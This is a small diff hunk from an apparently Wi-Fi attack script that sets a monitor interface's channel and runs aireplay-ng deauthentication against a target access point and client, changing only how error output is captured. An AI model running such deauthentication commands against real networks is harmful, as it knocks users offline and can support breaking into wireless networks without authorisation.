@@ -167,7 +167,7 @@ printf "Setting the monitor channel to the same channel the target AP is on...\n
 sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
 
-aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF)
+aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF 2>&1)
 
 if [[ $aireout == *No such BSSID available* ]]; then
     while true; do
